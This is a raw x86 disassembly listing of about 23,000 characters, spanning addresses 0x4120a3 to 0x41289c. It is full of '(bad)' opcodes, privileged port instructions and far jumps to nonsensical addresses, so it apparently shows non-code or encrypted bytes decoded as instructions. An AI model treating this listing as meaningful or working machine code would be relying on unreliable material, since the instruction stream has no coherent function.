  4120a3:	dec    ebx
  4120a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120a5:	mov    dh,0x5d
  4120a7:	dec    eax
  4120a8:	add    al,0xe8
  4120aa:	out    dx,al
  4120ab:	xor    ch,ah
  4120ad:	mov    bh,0xe9
  4120af:	adc    bh,bl
  4120b1:	mov    edi,0xe1da5d
  4120b6:	fdiv   QWORD PTR [edi-0x7ed1c3d1]
  4120bc:	test   WORD PTR [esi+eax*4-0x23],di
  4120c1:	pop    esi
  4120c2:	jb     0x41206b
  4120c4:	mov    al,0x2
  4120c6:	ja     0x412126
  4120c8:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120ca:	xchg   ecx,eax
  4120cb:	ins    DWORD PTR es:[edi],dx
  4120cc:	fcmovb st,st(0)
  4120ce:	pop    edx
  4120cf:	push   0x4c7519a8
  4120d4:	and    edi,ebx
  4120d6:	mov    ebx,ss
  4120d8:	sbb    cl,bl
  4120da:	loope  0x41206b
  4120dc:	push   ds
  4120dd:	jae    0x4120cd
  4120df:	popf   
  4120e0:	iret   
  4120e1:	cld    
  4120e2:	ret    
  4120e3:	push   edx
  4120e4:	jb     0x4120a1
  4120e6:	repz call 0x255e2862
  4120ec:	test   bl,cl
  4120ee:	adc    ch,dh
  4120f0:	inc    ebx
  4120f1:	mov    esp,DWORD PTR [ebx+edx*8-0x12]
  4120f5:	adc    DWORD PTR [ebx],esi
  4120f7:	xchg   esp,eax
  4120f8:	sbb    ebx,DWORD PTR [esi+0x70]
  4120fb:	xor    BYTE PTR [eax-0x8],0x82
  4120ff:	mov    ecx,0xf100bfc4
  412104:	adc    ecx,DWORD PTR [ebp-0xaaa81d8]
  41210a:	and    al,0x92
  41210c:	or     cl,BYTE PTR ds:0x8cebfcf9
  412112:	les    esi,FWORD PTR ds:0xf8830969
  412118:	cmp    eax,DWORD PTR [ecx+0x1edd3ec0]
  41211e:	ja     0x4120fa
  412120:	pop    esi
  412121:	loope  0x4120cf
  412123:	out    dx,al
  412124:	pusha  
  412125:	and    esp,edx
  412127:	std    
  412128:	(bad)  
  412129:	gs pop edi
  41212b:	and    ecx,DWORD PTR [esi+0x6719a1eb]
  412131:	out    dx,eax
  412132:	push   esi
  412133:	int3   
  412134:	iret   
  412135:	sbb    al,0x54
  412137:	inc    ebp
  412138:	test   eax,0xc7047792
  41213d:	iret   
  41213e:	xchg   ah,bl
  412140:	outs   dx,DWORD PTR ds:[esi]
  412141:	retf   
  412142:	rol    BYTE PTR [eax],cl
  412144:	sub    DWORD PTR [ecx-0x2cc0451f],0xffffffeb
  41214b:	xchg   edi,eax
  41214c:	xor    ebp,ebx
  41214e:	je     0x412185
  412150:	iret   
  412151:	test   dh,bh
  412153:	in     al,0xcb
  412155:	jo     0x4121c2
  412157:	adc    dl,cl
  412159:	add    BYTE PTR [ebp+ecx*2-0x372e2ca],al
  412160:	push   ecx
  412161:	lods   eax,DWORD PTR ds:[esi]
  412162:	out    0x8c,eax
  412164:	sub    eax,0xe0f162d8
  412169:	xchg   DWORD PTR [eax+0x223e2631],ecx
  41216f:	and    ch,cl
  412171:	adc    dh,BYTE PTR [ecx-0x51]
  412174:	fld    TBYTE PTR gs:[esi-0x71]
  412178:	sub    DWORD PTR [ecx+ecx*8],edi
  41217b:	and    al,0x37
  41217d:	sbb    eax,0x1177d96
  412182:	sbb    DWORD PTR [edi],0x46
  412185:	imul   esi,DWORD PTR [ebp+0x5d],0xffffffa5
  412189:	mov    esp,0x94da57ef
  41218e:	pop    ebx
  41218f:	lock retf 
  412191:	pop    es
  412192:	push   esi
  412193:	pop    ebp
  412194:	xchg   esi,eax
  412195:	rcr    BYTE PTR [edx+0x4a95a13],0xab
  41219c:	iret   
  41219d:	xchg   ebx,eax
  41219e:	push   ss
  41219f:	sbb    ah,BYTE PTR [ecx+0x646f3966]
  4121a5:	jae    0x4121ca
  4121a7:	inc    edx
  4121a8:	(bad)
  4121ab:	mov    ds:0xd447bb61,al
  4121b0:	fucomp st(1)
  4121b2:	mov    ah,dl
  4121b4:	cwde   
  4121b5:	dec    ebx
  4121b6:	adc    eax,0x5aca1de6
  4121bb:	fldenv [edx]
  4121bd:	bound  esi,QWORD PTR [esi]
  4121bf:	add    bh,BYTE PTR [ebp+0x3daaf4e0]
  4121c5:	mov    ds:0xe73885d7,al
  4121ca:	loop   0x412220
  4121cc:	fld    st(5)
  4121ce:	nop
  4121cf:	cmc    
  4121d0:	pusha  
  4121d1:	sub    BYTE PTR [ecx],al
  4121d3:	icebp  
  4121d4:	and    dh,BYTE PTR [ebx+edi*1]
  4121d7:	push   esi
  4121d8:	les    eax,FWORD PTR [esi+0x4a9c0d46]
  4121de:	out    0xf2,al
  4121e0:	xchg   dh,bh
  4121e2:	rcl    DWORD PTR [ebx+0x6d71d609],1
  4121e8:	scas   al,BYTE PTR es:[edi]
  4121e9:	inc    edi
  4121ea:	popa   
  4121eb:	mov    edi,0xa906dc40
  4121f1:	cmp    eax,0xf7e89228
  4121f6:	jmp    0xb4bf7e70
  4121fb:	sbb    BYTE PTR [eax+0x1b],ch
  4121fe:	ins    BYTE PTR es:[edi],dx
  4121ff:	jecxz  0x4121b2
  412201:	add    dl,BYTE PTR ds:0x6f71b5b6
  412208:	dec    ebx
  412209:	aam    0x64
  41220b:	mov    bl,0x7d
  41220d:	adc    BYTE PTR [ebp-0x2350848],bl
  412213:	adc    DWORD PTR [ebp+0x2615549d],edx
  412219:	test   DWORD PTR [edx+eiz*4-0x69],esp
  41221d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41221e:	pop    ss
  41221f:	mov    eax,0xad2f824
  412224:	jg     0x4121fc
  412226:	adc    ebx,ebx
  412228:	stos   BYTE PTR es:[edi],al
  412229:	adc    edx,DWORD PTR [ebx+0x7724e6a]
  41222f:	lock (bad) 
  412232:	mov    esi,DWORD PTR [ecx-0x52]
  412235:	pop    es
  412236:	cld    
  412237:	arpl   dx,di
  412239:	sti    
  41223a:	out    0x82,al
  41223c:	out    dx,eax
  41223d:	cli    
  41223e:	std    
  41223f:	ret    0xbe67
  412242:	ins    DWORD PTR es:[edi],dx
  412243:	push   ecx
  412244:	sub    al,0xd8
  412246:	call   0xfbc4:0xde547a7f
  41224d:	pusha  
  41224e:	(bad)  
  41224f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412250:	add    bl,BYTE PTR [eax+0x2519135e]
  412256:	aad    0xc9
  412258:	sbb    al,0x21
  41225a:	mov    edx,ecx
  41225c:	in     eax,0x6b
  41225e:	icebp  
  41225f:	jnp    0x412282
  412261:	sbb    eax,0xd96e13f8
  412266:	inc    esp
  412267:	mov    eax,ds:0x166401a5
  41226c:	loop   0x412274
  41226e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41226f:	cs out dx,al
  412271:	fs push edi
  412273:	mov    WORD PTR [ebx],fs
  412275:	aaa    
  412276:	add    al,0x4f
  412278:	retf   
  412279:	lods   al,BYTE PTR ds:[esi]
  41227a:	aam    0x1
  41227c:	pop    ss
  41227d:	mov    esp,ebx
  41227f:	(bad)  
  412280:	call   0x4e32a0de
  412285:	dec    esi
  412286:	in     eax,0x22
  412288:	xor    DWORD PTR [edi-0x5791e758],0xa508fba8
  412292:	xchg   esi,eax
  412293:	jle    0x412225
  412295:	shl    ecx,1
  412297:	aad    0xc7
  412299:	out    0x4,al
  41229b:	sbb    eax,0xf1edf10
  4122a0:	stos   DWORD PTR es:[edi],eax
  4122a1:	add    eax,0x5a31a446
  4122a6:	mov    bh,0xef
  4122a8:	jo     0x4122d6
  4122aa:	(bad)  
  4122ab:	in     eax,0xc0
  4122ad:	push   cs
  4122ae:	mov    ch,0xb6
  4122b0:	mov    DWORD PTR [esi],0x2b4579ed
  4122b6:	lahf   
  4122b7:	mov    esi,0x2d7444a9
  4122bc:	enter  0xb2ed,0x30
  4122c0:	jmp    0xe6c4:0x77bc7d9c
  4122c7:	sub    BYTE PTR ds:[edi],cl
  4122ca:	cs mov edi,0x6f19c3ca
  4122d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122d1:	mov    bh,0xe1
  4122d3:	enter  0x2390,0x87
  4122d7:	clc    
  4122d8:	push   ebp
  4122d9:	fstp   DWORD PTR [edi-0x125052b7]
  4122df:	gs ret 
  4122e1:	loopne 0x4122b2
  4122e3:	(bad)  
  4122e4:	fcom   DWORD PTR [ebx-0x4e]
  4122e7:	sbb    ecx,DWORD PTR [eax]
  4122e9:	ins    DWORD PTR es:[edi],dx
  4122ea:	pop    ecx
  4122eb:	push   es
  4122ec:	mov    eax,DWORD PTR [edx]
  4122ee:	popf   
  4122ef:	xor    BYTE PTR [edi+0x56bef906],dh
  4122f5:	xlat   BYTE PTR ds:[ebx]
  4122f6:	jg     0x41235c
  4122f8:	sbb    al,bl
  4122fa:	dec    edx
  4122fb:	cld    
  4122fc:	shl    BYTE PTR ds:0x58ba7401,0x86
  412303:	and    BYTE PTR [ebp-0x68cc1c74],0x2f
  41230a:	push   es
  41230b:	jmp    0xcce24249
  412310:	idiv   BYTE PTR [eax]
  412312:	adc    DWORD PTR [ecx],0x3a
  412315:	sar    BYTE PTR [esi+0x6f],0x24
  412319:	inc    edx
  41231a:	lock imul esp,DWORD PTR [si-0x10a8],0xcb44fd
  412324:	xor    bl,bh
  412326:	inc    eax
  412327:	mov    eax,ds:0xdb84db84
  41232c:	call   0xa15d:0x547c0882
  412333:	lds    eax,FWORD PTR [eax-0x7a160d0f]
  412339:	out    0xfa,eax
  41233b:	cmp    al,0x30
  41233d:	sbb    eax,0xc631eba5
  412342:	shld   DWORD PTR [ebp+0x15],esi,cl
  412346:	dec    edx
  412347:	(bad)  
  412348:	fwait
  412349:	pop    edi
  41234a:	jmp    0xeb50:0x35ea2eb1
  412351:	retf   
  412352:	ret    
  412353:	fwait
  412354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412355:	lods   al,BYTE PTR ds:[esi]
  412356:	jno    0x41231d
  412358:	xchg   edi,eax
  412359:	dec    ebp
  41235a:	dec    eax
  41235b:	mov    ch,0x24
  41235d:	xor    dl,al
  41235f:	and    eax,0xbe39ec0d
  412364:	mov    bl,0x26
  412366:	aad    0x15
  412368:	xchg   DWORD PTR [ebp-0x75],eax
  41236b:	test   dl,dh
  41236d:	lahf   
  41236e:	jmp    0x2598:0xd608fb75
  412375:	out    dx,eax
  412376:	mov    BYTE PTR [eax-0x7f3b4539],al
  41237c:	ja     0x4123b7
  41237e:	in     al,dx
  41237f:	mov    cl,0xf0
  412381:	in     al,0x3e
  412383:	and    BYTE PTR [eax+ebp*8+0xf],ah
  412387:	call   0xcfdf:0x41d6e043
  41238e:	sti    
  41238f:	or     BYTE PTR [esi+0x2b],bl
  412392:	jno    0x412349
  412394:	popa   
  412395:	jne    0x4123a5
  412397:	cmp    ecx,DWORD PTR [esi+0x56d9ee20]
  41239d:	lods   eax,DWORD PTR ds:[esi]
  41239e:	or     BYTE PTR [eax-0x1574bc95],ch
  4123a4:	adc    edi,esi
  4123a6:	mov    bh,0x9
  4123a8:	dec    ebp
  4123a9:	pop    edx
  4123aa:	pushf  
  4123ab:	adc    al,0x5a
  4123ad:	add    eax,0xfe2ab386
  4123b2:	arpl   WORD PTR [ebx],dx
  4123b4:	(bad)  
  4123b5:	(bad)  
  4123b6:	cmp    eax,0xa50ccd39
  4123bb:	bound  esp,QWORD PTR [edi+0xe]
  4123be:	scas   al,BYTE PTR es:[edi]
  4123bf:	mov    ecx,0x5825102e
  4123c4:	hlt    
  4123c5:	(bad)  
  4123c7:	jb     0x412362
  4123c9:	fisttp QWORD PTR [esp+ebx*8-0x1a6d2a0e]
  4123d0:	push   0xfffffff1
  4123d2:	push   esi
  4123d3:	ins    BYTE PTR es:[edi],dx
  4123d4:	pop    ebx
  4123d5:	xchg   esp,eax
  4123d6:	mov    ds:0x952f83ca,eax
  4123db:	sub    BYTE PTR [esi+ecx*1],bh
  4123de:	imul   ecx,DWORD PTR [esi],0x38
  4123e1:	scas   eax,DWORD PTR es:[edi]
  4123e2:	cmp    esi,DWORD PTR [eax+0x5b]
  4123e5:	gs add eax,0xe057dbeb
  4123eb:	jne    0x4123e8
  4123ed:	mov    edx,0x1232932f
  4123f2:	mov    bh,0x54
  4123f4:	test   DWORD PTR [edx],0x8c8b3a35
  4123fa:	call   0xfcde1747
  4123ff:	fiadd  DWORD PTR [ecx+0x35]
  412402:	mov    ds:0x5dfa09,eax
  412407:	or     eax,DWORD PTR [esp+eax*2-0x19]
  41240b:	fistp  WORD PTR [esi]
  41240d:	push   edx
  41240e:	jmp    0x76f13dae
  412413:	inc    ebx
  412414:	adc    al,0x49
  412416:	dec    esi
  412417:	jmp    0x5752bf32
  41241c:	sub    cl,BYTE PTR [eax+0x6b]
  41241f:	pop    eax
  412420:	loope  0x41243b
  412422:	jle    0x412425
  412424:	rol    BYTE PTR [esi-0x42],0x29
  412428:	cmp    al,0x16
  41242a:	pop    ss
  41242b:	retf   
  41242c:	mov    ds:0x28f0c702,al
  412431:	daa    
  412432:	aas    
  412433:	ins    BYTE PTR es:[edi],dx
  412434:	pop    edx
  412435:	popa   
  412436:	mov    bl,cl
  412438:	sbb    al,0xab
  41243a:	mov    cl,0xd
  41243c:	jne    0x4123cc
  41243e:	scas   eax,DWORD PTR es:[edi]
  41243f:	and    dh,0xa2
  412442:	mov    eax,0x9404d95f
  412447:	outs   dx,BYTE PTR ds:[esi]
  412448:	dec    esp
  412449:	jp     0x41242b
  41244b:	dec    ebp
  41244c:	dec    ecx
  41244d:	nop
  41244e:	xchg   ecx,eax
  41244f:	dec    ebp
  412450:	lock in al,0x9d
  412453:	shl    BYTE PTR [edi],1
  412455:	xchg   BYTE PTR [ebx-0x487ed006],al
  41245b:	mov    eax,ds:0xf4165743
  412460:	stos   DWORD PTR es:[edi],eax
  412461:	xchg   ebp,eax
  412462:	in     eax,0xd5
  412464:	fcmovb st,st(3)
  412466:	idiv   ebx
  412468:	jns    0x4124c0
  41246a:	dec    esi
  41246b:	pop    ss
  41246c:	(bad)  [eax-0x4422fa18]
  412472:	retf   
  412473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412474:	mov    cl,0xe0
  412476:	sub    esi,DWORD PTR [edi-0x3cbdba98]
  41247c:	in     al,0x9d
  41247e:	jmp    0x4124be
  412480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412481:	add    al,0x9c
  412483:	adc    al,BYTE PTR [eax-0x313cae32]
  412489:	jmp    0x6b302f0e
  41248e:	test   BYTE PTR [ecx+0x32f1f38e],bl
  412494:	test   DWORD PTR [ebx+0x7],esi
  412497:	jl     0x41244e
  412499:	mov    al,ds:0x80c1d8a1
  41249e:	jnp    0x4124a8
  4124a0:	imul   esp,edx,0x639a15c2
  4124a6:	loop   0x412429
  4124a8:	ins    DWORD PTR es:[edi],dx
  4124a9:	inc    esp
  4124aa:	xchg   ebp,eax
  4124ab:	ds scas eax,DWORD PTR es:[edi]
  4124ad:	popa   
  4124ae:	mov    WORD PTR [ebx-0x11],?
  4124b1:	xor    al,0xea
  4124b3:	jmp    0x11001e08
  4124b8:	xor    BYTE PTR [ebx+0x72],cl
  4124bb:	pop    esp
  4124bc:	sbb    al,0x71
  4124be:	aam    0xbb
  4124c0:	shl    BYTE PTR [ecx+0x5c],0x2d
  4124c4:	bndldx bnd0,[edi-0x4aa09925]
  4124cb:	mov    ecx,DWORD PTR [ebx-0x198f0750]
  4124d1:	scas   eax,DWORD PTR es:[edi]
  4124d2:	addr16 or eax,0x5af82aac
  4124d8:	dec    esp
  4124d9:	std    
  4124da:	out    dx,eax
  4124db:	xchg   ebx,ecx
  4124dd:	mov    cl,0x3
  4124df:	mov    ebx,0xe075bb65
  4124e4:	mov    eax,ds:0xc42b51a
  4124e9:	jae    0x412546
  4124eb:	adc    DWORD PTR [eax],ebp
  4124ed:	or     DWORD PTR [ebp-0x23],0x5b639cd3
  4124f4:	retf   0xaa58
  4124f7:	into   
  4124f8:	outs   dx,DWORD PTR ds:[esi]
  4124f9:	inc    ebp
  4124fa:	imul   DWORD PTR [ebp+0x55]
  4124fd:	das    
  4124fe:	add    eax,0xce359b3
  412503:	dec    ecx
  412504:	popf   
  412505:	into   
  412506:	adc    bh,dl
  412508:	mov    esp,0x811c34c6
  41250d:	mov    cl,BYTE PTR [ebx+0x34]
  412510:	shl    DWORD PTR [edx-0x74],1
  412513:	dec    eax
  412514:	push   cs
  412515:	and    BYTE PTR [ebp-0x4ce5e0a2],0xfc
  41251c:	add    eax,0x33632250
  412521:	cmp    BYTE PTR [eax+0x39644447],ch
  412527:	xor    eax,0x120b82e6
  41252c:	mov    bh,BYTE PTR [ecx+0x1]
  41252f:	into   
  412530:	adc    al,0x76
  412532:	aad    0x8a
  412534:	addr16 sbb eax,0xbefef03e
  41253a:	sub    ebp,ebp
  41253c:	add    eax,edi
  41253e:	das    
  41253f:	cmc    
  412540:	mov    bh,0x43
  412542:	fwait
  412543:	sbb    DWORD PTR [ebp-0x3e3835d0],esi
  412549:	and    edx,ecx
  41254b:	cs push ebx
  41254d:	pushf  
  41254e:	aad    0xb2
  412550:	iret   
  412551:	adc    DWORD PTR [ecx-0x25],0x5d
  412555:	mov    cl,0x8f
  412557:	cmp    eax,0xa93a8ca6
  41255c:	inc    ecx
  41255d:	pop    esp
  41255e:	mov    BYTE PTR [ecx+0x38ea9286],dh
  412564:	adc    al,0x7c
  412566:	mov    ebp,DWORD PTR [edi]
  412568:	int    0x9e
  41256a:	aam    0xd2
  41256c:	or     eax,0xde626a85
  412571:	sub    bh,BYTE PTR ss:[ecx]
  412574:	jns    0x4125eb
  412576:	rol    DWORD PTR ds:[ebx-0x4e3a112a],1
  41257d:	aaa    
  41257e:	out    dx,al
  41257f:	in     al,0xb8
  412581:	sbb    eax,0x31e3e6d9
  412586:	inc    edx
  412587:	test   al,0x3c
  412589:	mov    bl,BYTE PTR [edx]
  41258b:	call   0x22ae45d1
  412590:	scas   al,BYTE PTR es:[edi]
  412591:	mov    dl,0xc8
  412593:	dec    ebx
  412594:	popa   
  412595:	mov    ebp,0x3ffe69b1
  41259a:	mov    esi,0xbae2c54e
  41259f:	mov    esp,0x416eb7f3
  4125a4:	adc    esi,DWORD PTR [ebp-0x4]
  4125a7:	repz int3 
  4125a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125aa:	pop    esi
  4125ab:	or     al,0xc9
  4125ad:	and    edx,DWORD PTR [esi]
  4125af:	stc    
  4125b0:	jmp    0xa9c6690
  4125b5:	mov    edx,0x47c8a8b2
  4125ba:	mov    bl,0xbd
  4125bc:	or     edi,DWORD PTR [esi-0x1]
  4125bf:	inc    esp
  4125c0:	bound  ebp,QWORD PTR [edx-0x410ee3b6]
  4125c6:	push   edi
  4125c7:	int3   
  4125c8:	sbb    eax,0x493c6bbd
  4125cd:	int    0xc3
  4125cf:	mov    ds:0x9d13e895,al
  4125d4:	push   esi
  4125d5:	hlt    
  4125d6:	dec    eax
  4125d7:	cmc    
  4125d8:	rcr    DWORD PTR [esi],1
  4125da:	pop    ss
  4125db:	(bad)  
  4125dc:	push   0xbfed0c71
  4125e1:	pop    ss
  4125e2:	out    0xb8,al
  4125e4:	dec    edx
  4125e5:	pop    ebx
  4125e6:	push   0x42
  4125e8:	nop
  4125e9:	iret   
  4125ea:	xor    eax,0x82327448
  4125ef:	retf   0xb11d
  4125f2:	xor    al,0x21
  4125f4:	ds lahf 
  4125f6:	sbb    eax,0x1b8c9deb
  4125fb:	sub    BYTE PTR [edx-0x20],ch
  4125fe:	rcl    BYTE PTR [eax+0x56],cl
  412601:	sbb    dh,0x49
  412604:	arpl   si,di
  412606:	shr    ebx,1
  412608:	popa   
  412609:	not    DWORD PTR [eax]
  41260b:	rcl    BYTE PTR [ebx],cl
  41260d:	pop    ebp
  41260e:	mov    dh,0x8b
  412610:	inc    edx
  412611:	fcomp  DWORD PTR [ebx-0x619eee89]
  412617:	push   eax
  412618:	mov    ah,BYTE PTR [ebx+0x51]
  41261b:	mov    BYTE PTR [eax-0x1782d6b1],ah
  412621:	dec    ecx
  412622:	jne    0x412681
  412624:	outs   dx,BYTE PTR ds:[esi]
  412625:	stos   BYTE PTR es:[edi],al
  412626:	out    dx,eax
  412627:	imul   ebp,DWORD PTR [ebx],0xffffff96
  41262a:	fwait
  41262b:	sbb    cl,al
  41262d:	push   ds
  41262e:	sub    al,0x3b
  412630:	cmp    DWORD PTR [ecx],esi
  412632:	outs   dx,DWORD PTR ds:[esi]
  412633:	and    al,0x4f
  412635:	jbe    0x4125f7
  412637:	int    0xb7
  412639:	stos   BYTE PTR es:[edi],al
  41263a:	dec    eax
  41263b:	and    al,0xef
  41263d:	mov    ebx,0x6b9c431c
  412642:	or     DWORD PTR [edi],0xffffffe9
  412645:	xchg   ecx,eax
  412646:	std    
  412647:	push   0xacf52e67
  41264c:	out    0xd5,al
  41264e:	pop    eax
  41264f:	fucom  st(0)
  412651:	fstp   TBYTE PTR [ecx+esi*2-0xcb5191c]
  412658:	jl     0x4126bb
  41265a:	addr16 fsin 
  41265d:	push   edi
  41265e:	add    ah,BYTE PTR [ecx-0x7a]
  412661:	inc    ecx
  412663:	out    dx,eax
  412664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412665:	outs   dx,BYTE PTR ds:[esi]
  412666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412667:	mov    esi,0x803afc18
  41266c:	push   eax
  41266d:	rcr    BYTE PTR ds:0x9e27edef,1
  412673:	push   eax
  412674:	neg    ah
  412676:	or     BYTE PTR [eax],ah
  412678:	push   0x101cd2a6
  41267d:	inc    ebx
  41267e:	data16 ficomp DWORD PTR [edx]
  412681:	int3   
  412682:	daa    
  412683:	xchg   esp,eax
  412684:	jae    0x41264e
  412686:	jmp    0x4126dc
  412688:	jmp    0x94a5:0x4715bf37
  41268f:	cmp    DWORD PTR [eax+edi*2+0x25bf7f2f],ebp
  412696:	cs into 
  412698:	sub    DWORD PTR [edi+0x7528c54a],edi
  41269e:	loope  0x412653
  4126a0:	xor    eax,0x27848311
  4126a5:	cli    
  4126a6:	sub    edx,edi
  4126a8:	mov    eax,0x95d3e7e9
  4126ad:	jne    0x41271f
  4126af:	adc    al,0xa2
  4126b1:	xlat   BYTE PTR ds:[ebx]
  4126b2:	push   ss
  4126b3:	mov    eax,ds:0x377505ad
  4126b8:	sbb    eax,0x663358bc
  4126bd:	(bad)  
  4126be:	aas    
  4126bf:	fnop   
  4126c1:	jle    0x41267f
  4126c3:	retf   0xf925
  4126c6:	add    eax,0x736f3c98
  4126cb:	fstp   DWORD PTR [edx-0x84074e1]
  4126d1:	outs   dx,DWORD PTR ds:[esi]
  4126d2:	lds    edx,FWORD PTR [eax-0x6562f6fb]
  4126d8:	imul   eax,DWORD PTR [ecx+edi*1],0xffffff80
  4126dc:	bound  eax,QWORD PTR [esp+edx*2+0x71]
  4126e0:	popf   
  4126e1:	(bad)  
  4126e2:	push   0x3dcdd0dc
  4126e7:	fadd   QWORD PTR [ebp-0x1a1e3823]
  4126ed:	out    0x32,al
  4126ef:	rcr    BYTE PTR [eax-0x509102f2],1
  4126f5:	stos   DWORD PTR es:[edi],eax
  4126f6:	inc    edx
  4126f7:	fcomp  DWORD PTR [eax]
  4126f9:	test   al,0x87
  4126fb:	ins    DWORD PTR es:[edi],dx
  4126fc:	inc    ebx
  4126fd:	in     al,dx
  4126fe:	add    dh,dh
  412700:	jbe    0x412738
  412702:	and    DWORD PTR [eax],ebp
  412704:	push   cs
  412705:	xchg   edi,eax
  412706:	mov    eax,ds:0xb4be5491
  41270b:	sbb    eax,0x3444be75
  412710:	gs xchg ecx,eax
  412712:	mov    al,ds:0xd67d739f
  412717:	push   edx
  412718:	cmp    DWORD PTR [eax],ecx
  41271a:	xor    ecx,ebp
  41271c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41271d:	dec    ecx
  41271e:	fst    QWORD PTR [eax-0x5b2365f2]
  412724:	mov    dl,0x45
  412726:	aaa    
  412727:	aad    0x67
  412729:	fistp  QWORD PTR ds:0x26812845
  41272f:	cs retf 
  412731:	shr    dl,1
  412733:	jmp    0x4dbc:0x59359c1
  41273a:	iret   
  41273b:	popf   
  41273c:	and    edx,esi
  41273e:	call   0x2dc6a328
  412743:	fld    QWORD PTR [edx-0x1b967e13]
  412749:	(bad)  
  41274a:	cld    
  41274b:	inc    edi
  41274c:	jle    0x412720
  41274e:	loopne 0x4127a8
  412750:	adc    bh,al
  412752:	pop    ds
  412753:	ins    BYTE PTR es:[edi],dx
  412754:	push   ds
  412755:	cmp    ecx,DWORD PTR [ebx-0x21b37bc5]
  41275b:	cmp    al,0x5
  41275d:	cli    
  41275e:	dec    BYTE PTR [eax+0x6]
  412761:	mov    ch,0x22
  412763:	stos   DWORD PTR es:[edi],eax
  412764:	test   al,0x8f
  412766:	das    
  412767:	or     ah,0x10
  41276a:	scas   al,BYTE PTR es:[edi]
  41276b:	mov    ebx,0x83c29f98
  412770:	xor    al,BYTE PTR [ebp+ebx*2-0x65f6968f]
  412777:	xor    eax,0x68c55e12
  41277c:	clc    
  41277d:	sti    
  41277e:	dec    ebp
  41277f:	pop    ds
  412780:	dec    eax
  412781:	sub    eax,DWORD PTR [esi-0x40cd3630]
  412787:	arpl   WORD PTR [edx],bx
  412789:	out    0x90,al
  41278b:	inc    edi
  41278c:	imul   esp,DWORD PTR [edi+ecx*2-0x34],0xd
  412791:	xchg   eax,edx
  412793:	shl    DWORD PTR [esi],cl
  412795:	jle    0x412770
  412797:	pop    ds
  412798:	push   esi
  412799:	inc    edx
  41279a:	and    ebp,edx
  41279c:	out    0x5e,eax
  41279e:	gs clc 
  4127a0:	sbb    bh,cl
  4127a2:	ret    0x49ad
  4127a5:	sahf   
  4127a6:	and    al,BYTE PTR [ebx-0x5e]
  4127a9:	jo     0x41275d
  4127ab:	adc    eax,0x4dd8694c
  4127b0:	lea    eax,[ebx+0xad3ed8a]
  4127b6:	or     esp,DWORD PTR ds:0x178273f8
  4127bc:	in     al,dx
  4127bd:	adc    BYTE PTR [eax-0x2e],bl
  4127c0:	dec    edx
  4127c1:	inc    edi
  4127c2:	jmp    0x3d8d:0x30ec37d5
  4127c9:	push   ebx
  4127ca:	mov    ebp,0x6ae2b4b2
  4127cf:	adc    BYTE PTR [eax],0xa5
  4127d2:	pop    eax
  4127d3:	adc    DWORD PTR [eax+0x5b],ebx
  4127d6:	lds    ebx,FWORD PTR [ecx+0x67]
  4127d9:	cmp    al,0xcb
  4127db:	pop    esi
  4127dc:	(bad)  
  4127dd:	jmp    0x90c2cf3d
  4127e2:	xor    eax,0x39edf8ad
  4127e7:	lds    eax,FWORD PTR [ebx-0x6]
  4127ea:	stos   BYTE PTR es:[edi],al
  4127eb:	scas   al,BYTE PTR es:[edi]
  4127ec:	cli    
  4127ed:	repz retf 
  4127ef:	push   ds
  4127f0:	jb     0x412786
  4127f2:	pop    eax
  4127f3:	in     eax,0x0
  4127f5:	shr    DWORD PTR [eax],cl
  4127f7:	das    
  4127f8:	push   0x62
  4127fa:	pop    eax
  4127fb:	aad    0xd2
  4127fd:	xchg   ebp,eax
  4127fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412800:	inc    esp
  412801:	push   ecx
  412802:	int    0x51
  412804:	push   ebx
  412805:	mov    edx,0x3dc9633f
  41280a:	and    DWORD PTR ds:0xfacb6b51,ebx
  412810:	jne    0x4127e7
  412812:	push   cs
  412813:	out    0x98,al
  412815:	ficomp WORD PTR [ecx-0x4d898b4b]
  41281b:	xor    BYTE PTR [eax+0x1247080d],al
  412821:	(bad)
  412825:	out    dx,al
  412826:	loope  0x412853
  412828:	sbb    eax,0xae187c85
  41282d:	mov    cl,0xb4
  41282f:	xor    BYTE PTR [edi-0x76],0x2f
  412833:	push   cs
  412834:	sbb    BYTE PTR [eax-0xc],al
  412837:	xor    ebx,DWORD PTR [esp+eax*8-0x67]
  41283b:	inc    edx
  41283c:	pop    eax
  41283d:	sub    eax,0xcf38b0f3
  412842:	adc    eax,0x6d05c3a6
  412847:	jp     0x41282f
  412849:	test   eax,esi
  41284b:	push   esp
  41284c:	shr    DWORD PTR [eax-0x78],1
  41284f:	addr16 jns 0x412865
  412852:	inc    ebx
  412853:	mov    cl,0xe8
  412855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412856:	cdq    
  412857:	mov    ebx,0x1e099230
  41285c:	mov    dh,0x84
  41285e:	gs cmp al,0x6a
  412861:	outs   dx,BYTE PTR ds:[esi]
  412862:	push   edi
  412863:	dec    eax
  412864:	retf   0x7539
  412867:	or     DWORD PTR [esi-0xec271ad],ebp
  41286d:	pop    esi
  41286e:	(bad)  
  41286f:	push   ds
  412870:	mov    ebp,0x6c498f02
  412875:	lods   al,BYTE PTR ds:[esi]
  412876:	cmp    DWORD PTR [eax+0x6e],0xffffffbd
  41287a:	xchg   edi,eax
  41287b:	into   
  41287c:	add    al,0xfd
  41287e:	mov    dh,0x39
  412880:	pusha  
  412881:	fcom   DWORD PTR [ebp-0x2f]
  412884:	inc    edx
  412885:	out    dx,eax
  412886:	mov    ecx,0xa9727439
  41288b:	cmp    eax,0x5d724a49
  412890:	popf   
  412891:	push   ss
  412892:	popf   
  412893:	and    DWORD PTR [eax-0x529ad3ac],ecx
  412899:	scas   eax,DWORD PTR es:[edi]
  41289a:	jp     0x41286b
  41289c:	shr    eax,cl
